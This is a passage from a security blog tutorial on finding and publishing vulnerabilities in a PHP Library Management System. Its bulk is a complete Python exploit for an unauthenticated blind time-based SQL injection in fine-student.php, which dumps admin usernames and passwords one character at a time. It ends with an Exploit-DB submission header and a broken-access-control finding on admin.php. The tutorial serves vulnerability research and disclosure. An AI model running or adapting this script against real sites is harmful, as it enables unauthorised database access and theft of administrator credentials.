    <span>HOST</span>  <span>=</span> <span>&#34;http://localhost&#34;</span>
    <span>PATH</span>  <span>=</span> <span>HOST</span><span>+</span><span>&#34;/LibraryManagement/fine-student.php&#34;</span>
    <span>adminPassword</span>  <span>=</span> <span>{</span> <span>&#34;id&#34;</span><span>:</span><span>&#34;1&#34;</span><span>,</span> <span>&#34;table&#34;</span><span>:</span><span>&#34;admin&#34;</span><span>,</span> <span>&#34;column&#34;</span><span>:</span><span>&#34;password&#34;</span><span>}</span>
    <span>adminPass</span> <span>=</span> <span>theHarvester</span><span>(</span><span>adminPassword</span><span>,</span><span>chars</span><span>,</span><span>PATH</span><span>)</span>
</code></pre></div></div>

<p>You may need to install the module dependencies:</p>

<div><div><pre><code>python3 <span>-m</span> pip <span>install </span>requests
python3 <span>-m</span> pip <span>install </span>colorama
python3 <span>-m</span> pip <span>install </span>argparse
</code></pre></div></div>

<p>We will also be running this through BurpSuite proxy at this point in our exploit development.</p>

<p>Running the exploit, we see that when we guess the correct character of the password, the time delay will be &gt;1 second:</p>

<p><img src="https://0xboku.com/assets/images/webwb/getChar1.png" alt=""/></p>

<p>Look at that! Its the first char of the admin’s password <code>1</code>!</p>

<p>At this point we could simply dump the password like this:</p>

<p><img src="https://0xboku.com/assets/images/webwb/dumpPass.png" alt=""/></p>

<h2 id="add-some-1337-to-that-sploit">Add some 1337 to that Sploit</h2>
<p>Now that we have it returning the password, lets make it more user friendly.</p>



<p><img src="https://0xboku.com/assets/images/webwb/helpMenu.png" alt=""/></p>

<h3 id="code-for-the-final-exploit">Code for the final exploit:</h3>
<ul>
  <li>Make sure to come up with some ASCII art ;)</li>
</ul>

<div><div><pre><code><span>import</span> <span>requests</span><span>,</span><span>argparse</span>
<span>from</span> <span>colorama</span> <span>import</span> <span>(</span><span>Fore</span> <span>as</span> <span>F</span><span>,</span> <span>Back</span> <span>as</span> <span>B</span><span>,</span> <span>Style</span> <span>as</span> <span>S</span><span>)</span>

<span>BR</span><span>,</span><span>FT</span><span>,</span><span>FR</span><span>,</span><span>FG</span><span>,</span><span>FY</span><span>,</span><span>FB</span><span>,</span><span>FM</span><span>,</span><span>FC</span><span>,</span><span>ST</span><span>,</span><span>SD</span><span>,</span><span>SB</span> <span>=</span> <span>B</span><span>.</span><span>RED</span><span>,</span><span>F</span><span>.</span><span>RESET</span><span>,</span><span>F</span><span>.</span><span>RED</span><span>,</span><span>F</span><span>.</span><span>GREEN</span><span>,</span><span>F</span><span>.</span><span>YELLOW</span><span>,</span><span>F</span><span>.</span><span>BLUE</span><span>,</span><span>F</span><span>.</span><span>MAGENTA</span><span>,</span><span>F</span><span>.</span><span>CYAN</span><span>,</span><span>S</span><span>.</span><span>RESET_ALL</span><span>,</span><span>S</span><span>.</span><span>DIM</span><span>,</span><span>S</span><span>.</span><span>BRIGHT</span>
<span>def</span> <span>bullet</span><span>(</span><span>char</span><span>,</span><span>color</span><span>):</span>
    <span>C</span><span>=</span><span>FB</span> <span>if</span> <span>color</span> <span>==</span> <span>&#39;B&#39;</span> <span>else</span> <span>FR</span> <span>if</span> <span>color</span> <span>==</span> <span>&#39;R&#39;</span> <span>else</span> <span>FG</span>
    <span>return</span> <span>SB</span><span>+</span><span>C</span><span>+</span><span>&#39;[&#39;</span><span>+</span><span>ST</span><span>+</span><span>SB</span><span>+</span><span>char</span><span>+</span><span>SB</span><span>+</span><span>C</span><span>+</span><span>&#39;]&#39;</span><span>+</span><span>ST</span><span>+</span><span>&#39; &#39;</span>
<span>info</span><span>,</span><span>err</span><span>,</span><span>ok</span> <span>=</span> <span>bullet</span><span>(</span><span>&#39;-&#39;</span><span>,</span><span>&#39;B&#39;</span><span>),</span><span>bullet</span><span>(</span><span>&#39;!&#39;</span><span>,</span><span>&#39;R&#39;</span><span>),</span><span>bullet</span><span>(</span><span>&#39;+&#39;</span><span>,</span><span>&#39;G&#39;</span><span>)</span>
<span>requests</span><span>.</span><span>packages</span><span>.</span><span>urllib3</span><span>.</span><span>disable_warnings</span><span>(</span><span>requests</span><span>.</span><span>packages</span><span>.</span><span>urllib3</span><span>.</span><span>exceptions</span><span>.</span><span>InsecureRequestWarning</span><span>)</span>
<span>proxies</span>         <span>=</span> <span>{</span><span>&#39;http&#39;</span><span>:</span><span>&#39;http://127.0.0.1:8080&#39;</span><span>,</span><span>&#39;https&#39;</span><span>:</span><span>&#39;http://127.0.0.1:8080&#39;</span><span>}</span>

<span># POST /LibraryManagement/fine-student.php
# inject&#39; UNION SELECT IF(SUBSTRING(password,1,1) = &#39;1&#39;,sleep(1),null) FROM admin WHERE adminId=1; -- kamahamaha
</span><span>def</span> <span>sqliPayload</span><span>(</span><span>char</span><span>,</span><span>position</span><span>,</span><span>userid</span><span>,</span><span>column</span><span>,</span><span>table</span><span>):</span>
    <span>sqli</span>  <span>=</span> <span>&#39;inject</span><span>\&#39;</span><span> UNION SELECT IF(SUBSTRING(&#39;</span>
    <span>sqli</span> <span>+=</span> <span>str</span><span>(</span><span>column</span><span>)</span><span>+</span><span>&#39;,&#39;</span>
    <span>sqli</span> <span>+=</span> <span>str</span><span>(</span><span>position</span><span>)</span><span>+</span><span>&#39;,1) = </span><span>\&#39;</span><span>&#39;</span>
    <span>sqli</span> <span>+=</span> <span>str</span><span>(</span><span>char</span><span>)</span><span>+</span><span>&#39;</span><span>\&#39;</span><span>,sleep(1),null) FROM &#39;</span>
    <span>sqli</span> <span>+=</span> <span>str</span><span>(</span><span>table</span><span>)</span><span>+</span><span>&#39; WHERE adminId=&#39;</span>
    <span>sqli</span> <span>+=</span> <span>str</span><span>(</span><span>userid</span><span>)</span><span>+</span><span>&#39;; -- kamahamaha&#39;</span>
    <span>return</span> <span>sqli</span>

<span>chars</span> <span>=</span> <span>[</span> <span>&#39;a&#39;</span><span>,</span><span>&#39;b&#39;</span><span>,</span><span>&#39;c&#39;</span><span>,</span><span>&#39;d&#39;</span><span>,</span><span>&#39;e&#39;</span><span>,</span><span>&#39;f&#39;</span><span>,</span><span>&#39;g&#39;</span><span>,</span><span>&#39;h&#39;</span><span>,</span><span>&#39;i&#39;</span><span>,</span><span>&#39;j&#39;</span><span>,</span><span>&#39;k&#39;</span><span>,</span><span>&#39;l&#39;</span><span>,</span><span>&#39;m&#39;</span><span>,</span><span>&#39;n&#39;</span><span>,</span><span>&#39;o&#39;</span><span>,</span>
          <span>&#39;p&#39;</span><span>,</span><span>&#39;q&#39;</span><span>,</span><span>&#39;r&#39;</span><span>,</span><span>&#39;s&#39;</span><span>,</span><span>&#39;t&#39;</span><span>,</span><span>&#39;u&#39;</span><span>,</span><span>&#39;v&#39;</span><span>,</span><span>&#39;w&#39;</span><span>,</span><span>&#39;x&#39;</span><span>,</span><span>&#39;y&#39;</span><span>,</span><span>&#39;z&#39;</span><span>,</span><span>&#39;A&#39;</span><span>,</span><span>&#39;B&#39;</span><span>,</span><span>&#39;C&#39;</span><span>,</span><span>&#39;D&#39;</span><span>,</span>
          <span>&#39;E&#39;</span><span>,</span><span>&#39;F&#39;</span><span>,</span><span>&#39;G&#39;</span><span>,</span><span>&#39;H&#39;</span><span>,</span><span>&#39;I&#39;</span><span>,</span><span>&#39;J&#39;</span><span>,</span><span>&#39;K&#39;</span><span>,</span><span>&#39;L&#39;</span><span>,</span><span>&#39;M&#39;</span><span>,</span><span>&#39;N&#39;</span><span>,</span><span>&#39;O&#39;</span><span>,</span><span>&#39;P&#39;</span><span>,</span><span>&#39;Q&#39;</span><span>,</span><span>&#39;R&#39;</span><span>,</span><span>&#39;S&#39;</span><span>,</span>
          <span>&#39;T&#39;</span><span>,</span><span>&#39;U&#39;</span><span>,</span><span>&#39;V&#39;</span><span>,</span><span>&#39;W&#39;</span><span>,</span><span>&#39;X&#39;</span><span>,</span><span>&#39;Y&#39;</span><span>,</span><span>&#39;Z&#39;</span><span>,</span><span>&#39;0&#39;</span><span>,</span><span>&#39;1&#39;</span><span>,</span><span>&#39;2&#39;</span><span>,</span><span>&#39;3&#39;</span><span>,</span><span>&#39;4&#39;</span><span>,</span><span>&#39;5&#39;</span><span>,</span><span>&#39;6&#39;</span><span>,</span><span>&#39;7&#39;</span><span>,</span>
          <span>&#39;8&#39;</span><span>,</span><span>&#39;9&#39;</span><span>,</span><span>&#39;@&#39;</span><span>,</span><span>&#39;#&#39;</span><span>]</span>

<span>def</span> <span>postRequest</span><span>(</span><span>URL</span><span>,</span><span>sqliReq</span><span>,</span><span>char</span><span>,</span><span>position</span><span>,</span><span>pxy</span><span>):</span>
    <span>sqliURL</span> <span>=</span> <span>URL</span>
    <span>params</span> <span>=</span> <span>{</span><span>&#34;check&#34;</span><span>:</span><span>1</span><span>,</span><span>&#34;id&#34;</span><span>:</span><span>sqliReq</span><span>}</span>
    <span>if</span> <span>pxy</span><span>:</span>
        <span>req</span> <span>=</span> <span>requests</span><span>.</span><span>post</span><span>(</span><span>url</span><span>=</span><span>sqliURL</span><span>,</span> <span>data</span><span>=</span><span>params</span><span>,</span> <span>verify</span><span>=</span><span>False</span><span>,</span> <span>proxies</span><span>=</span><span>proxies</span><span>,</span><span>timeout</span><span>=</span><span>10</span><span>)</span>
    <span>else</span><span>:</span>
        <span>req</span> <span>=</span> <span>requests</span><span>.</span><span>post</span><span>(</span><span>url</span><span>=</span><span>sqliURL</span><span>,</span> <span>data</span><span>=</span><span>params</span><span>,</span> <span>verify</span><span>=</span><span>False</span><span>,</span> <span>timeout</span><span>=</span><span>10</span><span>)</span>
    <span>#print(&#34;{} : {}&#34;.format(char,req.elapsed.total_seconds()))
</span>    <span>return</span> <span>req</span><span>.</span><span>elapsed</span><span>.</span><span>total_seconds</span><span>()</span>

<span>def</span> <span>theHarvester</span><span>(</span><span>target</span><span>,</span><span>CHARS</span><span>,</span><span>url</span><span>,</span><span>pxy</span><span>):</span>
    <span>#print(&#34;Retrieving: {} {} {}&#34;.format(target[&#39;table&#39;],target[&#39;column&#39;],target[&#39;id&#39;]))
</span>    <span>position</span> <span>=</span> <span>1</span>
    <span>theHarvest</span> <span>=</span> <span>&#34;&#34;</span>
    <span>while</span> <span>position</span> <span>&lt;</span> <span>8</span><span>:</span>
        <span>for</span> <span>char</span> <span>in</span> <span>CHARS</span><span>:</span>
            <span>sqliReq</span> <span>=</span> <span>sqliPayload</span><span>(</span><span>char</span><span>,</span><span>position</span><span>,</span><span>target</span><span>[</span><span>&#39;id&#39;</span><span>],</span><span>target</span><span>[</span><span>&#39;column&#39;</span><span>],</span><span>target</span><span>[</span><span>&#39;table&#39;</span><span>])</span>
            <span>if</span> <span>postRequest</span><span>(</span><span>url</span><span>,</span><span>sqliReq</span><span>,</span><span>char</span><span>,</span><span>position</span><span>,</span><span>pxy</span><span>)</span> <span>&gt;</span> <span>1</span><span>:</span>
                <span>theHarvest</span> <span>+=</span> <span>char</span>
                <span>break</span><span>;</span>
        <span>position</span> <span>+=</span> <span>1</span>
    <span>return</span> <span>theHarvest</span>

<span>class</span> <span>userObj</span><span>:</span>
    <span>def</span> <span>__init__</span><span>(</span><span>self</span><span>,</span><span>username</span><span>,</span><span>password</span><span>):</span>
        <span>self</span><span>.</span><span>username</span> <span>=</span> <span>username</span>
        <span>self</span><span>.</span><span>password</span> <span>=</span> <span>password</span>

<span>class</span> <span>tableSize</span><span>:</span>
    <span>def</span> <span>__init__</span><span>(</span><span>self</span><span>,</span><span>sizeU</span><span>,</span><span>sizeP</span><span>):</span>
        <span>self</span><span>.</span><span>sizeU</span> <span>=</span> <span>sizeU</span>
        <span>self</span><span>.</span><span>sizeP</span> <span>=</span> <span>sizeP</span>
        <span>self</span><span>.</span><span>uTitle</span> <span>=</span> <span>&#34;Admin Usernames&#34;</span><span>+</span><span>&#34; &#34;</span><span>*</span><span>(</span><span>sizeU</span><span>-</span><span>15</span><span>)</span><span>+</span><span>BR</span><span>+</span><span>&#34; &#34;</span><span>+</span><span>ST</span>
        <span>self</span><span>.</span><span>pTitle</span> <span>=</span> <span>&#34;Admin Passwords&#34;</span><span>+</span><span>&#34; &#34;</span><span>*</span><span>(</span><span>sizeP</span><span>-</span><span>15</span><span>)</span><span>+</span><span>BR</span><span>+</span><span>&#34; &#34;</span><span>+</span><span>ST</span>
    <span>def</span> <span>printHeader</span><span>(</span><span>self</span><span>):</span>
        <span>width</span> <span>=</span> <span>self</span><span>.</span><span>sizeU</span><span>+</span><span>self</span><span>.</span><span>sizeP</span><span>+</span><span>3</span>
        <span>print</span><span>(</span><span>BR</span><span>+</span><span>&#34; &#34;</span><span>*</span><span>width</span><span>+</span><span>ST</span><span>)</span>
        <span>print</span><span>(</span><span>self</span><span>.</span><span>uTitle</span><span>,</span><span>self</span><span>.</span><span>pTitle</span><span>)</span>
        <span>print</span><span>(</span><span>BR</span><span>+</span><span>&#34; &#34;</span><span>*</span><span>width</span><span>+</span><span>ST</span><span>)</span>

<span>def</span> <span>printTableRow</span><span>(</span><span>user</span><span>,</span><span>size</span><span>):</span>
    <span>username</span> <span>=</span> <span>user</span><span>.</span><span>username</span>
    <span>unLen</span> <span>=</span> <span>len</span><span>(</span><span>username</span><span>)</span>
    <span>if</span> <span>unLen</span> <span>&lt;</span> <span>size</span><span>.</span><span>sizeU</span><span>:</span>
        <span>username</span> <span>=</span> <span>username</span><span>+</span><span>(</span><span>&#34; &#34;</span><span>*</span><span>(</span><span>size</span><span>.</span><span>sizeU</span> <span>-</span> <span>unLen</span><span>))</span>
    <span>else</span><span>:</span>
        <span>name</span> <span>=</span> <span>name</span><span>[:</span><span>size</span><span>.</span><span>sizeU</span><span>]</span>
    <span>username</span> <span>+=</span> <span>BR</span><span>+</span><span>&#34; &#34;</span><span>+</span><span>ST</span>
    <span>password</span> <span>=</span> <span>user</span><span>.</span><span>password</span>
    <span>pLen</span> <span>=</span> <span>len</span><span>(</span><span>password</span><span>)</span>
    <span>if</span> <span>pLen</span> <span>&lt;</span> <span>size</span><span>.</span><span>sizeP</span><span>:</span>
        <span>password</span> <span>=</span> <span>password</span><span>+</span><span>(</span><span>&#34; &#34;</span><span>*</span><span>(</span><span>size</span><span>.</span><span>sizeP</span> <span>-</span> <span>pLen</span><span>))</span>
    <span>else</span><span>:</span>
        <span>password</span> <span>=</span> <span>password</span><span>[:</span><span>size</span><span>.</span><span>sizeP</span><span>]</span>
    <span>password</span>  <span>+=</span> <span>BR</span><span>+</span><span>&#34; &#34;</span><span>+</span><span>ST</span>
    <span>print</span><span>(</span><span>username</span><span>,</span><span>password</span><span>)</span>

<span>def</span> <span>sig</span><span>():</span>
    <span>SIG</span>  <span>=</span> <span>SB</span><span>+</span><span>FY</span><span>+</span><span>&#34;         .-----.._       ,--.</span><span>\n</span><span>&#34;</span>
    <span>SIG</span> <span>+=</span> <span>FY</span><span>+</span><span>&#34;         |  ..    &gt;  ___ |  | .--.</span><span>\n</span><span>&#34;</span>
    <span>SIG</span> <span>+=</span> <span>FY</span><span>+</span><span>&#34;         |  |.&#39;  ,&#39;-&#39;&#34;</span><span>+</span><span>FR</span><span>+</span><span>&#34;* *&#34;</span><span>+</span><span>FY</span><span>+</span><span>&#34;&#39;-. |/  /__   __</span><span>\n</span><span>&#34;</span>
    <span>SIG</span> <span>+=</span> <span>FY</span><span>+</span><span>&#34;         |      &lt;/ &#34;</span><span>+</span><span>FR</span><span>+</span><span>&#34;*  *  *&#34;</span><span>+</span><span>FY</span><span>+</span><span>&#34; \   /   </span><span>\\</span><span>/   </span><span>\\\n</span><span>&#34;</span>
    <span>SIG</span> <span>+=</span> <span>FY</span><span>+</span><span>&#34;         |  |&gt;   )  &#34;</span><span>+</span><span>FR</span><span>+</span><span>&#34; * *&#34;</span><span>+</span><span>FY</span><span>+</span><span>&#34;   /    </span><span>\\</span><span>        </span><span>\\\n</span><span>&#34;</span>
    <span>SIG</span> <span>+=</span> <span>FY</span><span>+</span><span>&#34;         |____..- &#39;-.._..-&#39;_|</span><span>\\</span><span>___|._..</span><span>\\</span><span>___</span><span>\\\n</span><span>&#34;</span>
    <span>SIG</span> <span>+=</span> <span>FY</span><span>+</span><span>&#34;             _______&#34;</span><span>+</span><span>FR</span><span>+</span><span>&#34;github.com/boku7&#34;</span><span>+</span><span>FY</span><span>+</span><span>&#34;_____</span><span>\n</span><span>&#34;</span><span>+</span><span>ST</span>
    <span>return</span> <span>SIG</span>

<span>def</span> <span>argsetup</span><span>():</span>
    <span>about</span>  <span>=</span> <span>SB</span><span>+</span><span>FT</span><span>+</span><span>&#39;Unauthenticated Blind Time-Based SQL Injection Exploit - Library Manager&#39;</span><span>+</span><span>ST</span>
    <span>parser</span> <span>=</span> <span>argparse</span><span>.</span><span>ArgumentParser</span><span>(</span><span>description</span><span>=</span><span>about</span><span>)</span>
    <span>parser</span><span>.</span><span>add_argument</span><span>(</span><span>&#39;targetHost&#39;</span><span>,</span><span>type</span><span>=</span><span>str</span><span>,</span><span>help</span><span>=</span><span>&#39;The DNS routable target hostname. Example: &#34;http://0xBoku.com&#34;&#39;</span><span>)</span>
    <span>parser</span><span>.</span><span>add_argument</span><span>(</span><span>&#39;DumpXAdmins&#39;</span><span>,</span><span>type</span><span>=</span><span>int</span><span>,</span><span>help</span><span>=</span><span>&#39;Number of admin credentials to dump. Example: 5&#39;</span><span>)</span>
    <span>parser</span><span>.</span><span>add_argument</span><span>(</span><span>&#39;-p&#39;</span><span>,</span><span>&#39;--proxy&#39;</span><span>,</span><span>type</span><span>=</span><span>str</span><span>,</span><span>help</span><span>=</span><span>&#39;&lt;127.0.0.1:8080&gt; Proxy requests sent&#39;</span><span>)</span>
    <span>args</span> <span>=</span> <span>parser</span><span>.</span><span>parse_args</span><span>()</span>
    <span>if</span> <span>args</span><span>.</span><span>proxy</span><span>:</span>
        <span>regex</span> <span>=</span> <span>&#39;^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}:[0-9]{2,5}$&#39;</span>
        <span>if</span> <span>re</span><span>.</span><span>match</span><span>(</span><span>regex</span><span>,</span><span>args</span><span>.</span><span>proxy</span><span>,</span><span>re</span><span>.</span><span>IGNORECASE</span><span>):</span>
            <span>args</span><span>.</span><span>proxy</span> <span>=</span> <span>{</span><span>&#39;http&#39;</span><span>:</span><span>&#39;http://{}&#39;</span><span>.</span><span>format</span><span>(</span><span>args</span><span>.</span><span>proxy</span><span>),</span><span>&#39;https&#39;</span><span>:</span><span>&#39;https://{}&#39;</span><span>.</span><span>format</span><span>(</span><span>args</span><span>.</span><span>proxy</span><span>)}</span>
        <span>else</span><span>:</span>
            <span>print</span><span>(</span><span>&#39;{}Error:   Supplied proxy argument {} fails to match regex {}&#39;</span><span>.</span><span>format</span><span>(</span><span>err</span><span>,</span><span>args</span><span>.</span><span>proxy</span><span>,</span><span>regex</span><span>))</span>
            <span>print</span><span>(</span><span>&#39;{}Example: {} -p &#34;127.0.0.1:8080&#34;&#39;</span><span>.</span><span>format</span><span>(</span><span>err</span><span>,</span><span>sys</span><span>.</span><span>argv</span><span>[</span><span>0</span><span>]))</span>
            <span>sys</span><span>.</span><span>exit</span><span>(</span><span>-</span><span>1</span><span>)</span>
    <span>else</span><span>:</span>
        <span>proxy</span> <span>=</span> <span>False</span>
    <span>return</span> <span>args</span>

<span>if</span> <span>__name__</span> <span>==</span> <span>&#34;__main__&#34;</span><span>:</span>
    <span>header</span> <span>=</span> <span>SB</span><span>+</span><span>FT</span><span>+</span><span>&#39;               &#39;</span><span>+</span><span>FR</span><span>+</span><span>&#39; Bobby &#39;</span><span>+</span><span>FR</span><span>+</span><span>&#39;&#34;&#39;</span><span>+</span><span>FR</span><span>+</span><span>&#39;boku&#39;</span><span>+</span><span>FR</span><span>+</span><span>&#39;&#34;&#39;</span><span>+</span><span>FR</span><span>+</span><span>&#39; Cooke</span><span>\n</span><span>&#39;</span><span>+</span><span>ST</span>
    <span>print</span><span>(</span><span>header</span><span>)</span>
    <span>print</span><span>(</span><span>sig</span><span>())</span>
    <span>args</span>   <span>=</span> <span>argsetup</span><span>()</span>
    <span>host</span>   <span>=</span> <span>args</span><span>.</span><span>targetHost</span>
    <span>pxy</span>    <span>=</span> <span>args</span><span>.</span><span>proxy</span>
    <span>admins</span> <span>=</span> <span>args</span><span>.</span><span>DumpXAdmins</span>
    <span>PATH</span>   <span>=</span> <span>host</span><span>+</span><span>&#34;/LibraryManagement/fine-student.php&#34;</span>
    <span>size</span>  <span>=</span> <span>tableSize</span><span>(</span><span>20</span><span>,</span><span>20</span><span>)</span>
    <span>size</span><span>.</span><span>printHeader</span><span>()</span>
    <span>dumpnumber</span> <span>=</span> <span>1</span>
    <span>while</span> <span>dumpnumber</span> <span>&lt;=</span> <span>admins</span><span>:</span>
        <span>adminUsername</span>  <span>=</span> <span>{</span> <span>&#34;id&#34;</span><span>:</span><span>dumpnumber</span><span>,</span> <span>&#34;table&#34;</span><span>:</span><span>&#34;admin&#34;</span><span>,</span> <span>&#34;column&#34;</span><span>:</span><span>&#34;username&#34;</span><span>}</span>
        <span>adminUsername</span>  <span>=</span> <span>theHarvester</span><span>(</span><span>adminUsername</span><span>,</span><span>chars</span><span>,</span><span>PATH</span><span>,</span><span>pxy</span><span>)</span>
        <span>adminPassword</span>  <span>=</span> <span>{</span> <span>&#34;id&#34;</span><span>:</span><span>dumpnumber</span><span>,</span> <span>&#34;table&#34;</span><span>:</span><span>&#34;admin&#34;</span><span>,</span> <span>&#34;column&#34;</span><span>:</span><span>&#34;password&#34;</span><span>}</span>
        <span>adminPass</span> <span>=</span> <span>theHarvester</span><span>(</span><span>adminPassword</span><span>,</span><span>chars</span><span>,</span><span>PATH</span><span>,</span><span>pxy</span><span>)</span>
        <span>adminUser</span> <span>=</span> <span>userObj</span><span>(</span><span>adminUsername</span><span>,</span><span>adminPass</span><span>)</span>
        <span>printTableRow</span><span>(</span><span>adminUser</span><span>,</span><span>size</span><span>)</span>
        <span># print(&#34;Admin&#39;s Username is: {}&#34;.format(adminUsername))
</span>        <span># print(&#34;Admin&#39;s Password is: {}&#34;.format(adminPass))
</span>        <span>dumpnumber</span> <span>+=</span> <span>1</span>
</code></pre></div></div>

<p>Running the exploit we are able to dump the admin credentials table!</p>

<p><img src="https://0xboku.com/assets/images/webwb/xdev.png" alt=""/></p>

<p>Using the MySQL CLI we confirm that our exploit properly dumps the admin credentials:</p>

<p><img src="https://0xboku.com/assets/images/webwb/cliDump.png" alt=""/></p>


<p>Now that we have a working exploit, lets submit it!</p>


<p>We will add this to the top of exploit:</p>

<div><div><pre><code><span># Exploit Title: Library Management System v1.0 - Unauthenticated Blind Time-Based SQL Injection</span>
<span># Exploit Author: Bobby Cooke (boku)</span>
<span># Date: September 16, 2021</span>
<span># Vendor Homepage: https://www.sourcecodester.com/php/12469/library-management-system-using-php-mysql.html</span>
<span># Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/librarymanagement.zip</span>
<span># Tested on: Kali Linux, Apache, Mysql</span>
<span># Vendor: breakthrough2</span>
<span># Version: v1.0</span>
<span># Exploit Description:</span>
<span>#   Library Management System v1.0 suffers from an unauthenticated SQL Injection Vulnerability allowing remote attackers to dump the SQL database using a Blind SQL Injection attack.  </span>
</code></pre></div></div>

<h2 id="submitting-to-exploit-db">Submitting to Exploit-DB</h2>
<p>Now we review the submission guidelines at <a href="https://www.exploit-db.com/submit">Exploit-DB - Submissions</a>.</p>

<p><img src="https://0xboku.com/assets/images/webwb/edbSubmit.png" alt=""/></p>

<p>We have saved the exploit as a file, and will email it to: Offsec Exploits <a href="mailto:submit@offensive-security.com">submit@offensive-security.com</a></p>

<p><img src="https://0xboku.com/assets/images/webwb/sendEmail.png" alt=""/></p>

<h2 id="discovering-broken-access-control">Discovering Broken Access Control</h2>
<p>Another quick win is checking if the webpages check for session authentication before allowing access to the resource. This is a common vulnerability and has been categorized by OWASP as <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">A5:2017-Broken Access Control</a>. These vulnerabilities typically requiring a developer or code reviewer to know which pages are supposed to be public, and which require access controls. For this reason, SAST scanners are poor at detecting these vulnerabilities, and they can slip by undiscovered in a secure SDLC, right into production.</p>

<p>For PHP code pages like these, the logic for handling sessions and access controls is typically at the top. We can see by going to the <code>admin.php</code> page that the code logic which is supposed to protect this page from unauthenticated access is commented out:</p>

<p><img src="https://0xboku.com/assets/images/webwb/adminNoAC.png" alt=""/></p>

<p>Awesome we just got started and we’ve already found another vuln! We check to make sure this is the case by going to the <code>/admin.php</code> webpage in our browser:</p>

<p><img src="https://0xboku.com/assets/images/webwb/accessAdmin.png" alt=""/></p>

<h2 id="discover-more-vulns">Discover More Vulns!</h2>
<p>Now continue on with this setup and discover more vulnerabilties!</p>

<p>When you make a discovery, try to get them published!</p>

<p>Make a proof of concept exploit and submit it to:</p>
<ul>
  <li><a href="https://www.exploit-db.com/submit">Exploit-DB - Submissions</a></li>
  <li><a href="https://packetstormsecurity.com/submit/">packetstormsecurity</a></li>
  <li><a href="https://cveform.mitre.org/">MITRE CVE Submission Form</a>
    <ul>
      <li>Follow Adeeb &amp; I’s blog for more info on requesting a CVE from MITRE: <a href="https://hyd3.home.blog/2020/10/02/a-simple-guide-to-getting-cves/">A Simple Guide to Getting CVE’s</a></li>
    </ul>
  </li>
  <li><a href="https://cxsecurity.com/wlb/add/">CXSecurity Submit</a></li>
</ul>

<p>After knocking out some of the easier apps, move on to bigger open source projects. Get used to setting up applications for different environments like .NET, Java, Go, Python, ++. The harder the environment is to setup, the more likely it hasn’t been security tested. Good luck!</p>

        
      </section>

      

      


      
  

    </div></div>
  </body>
</html>
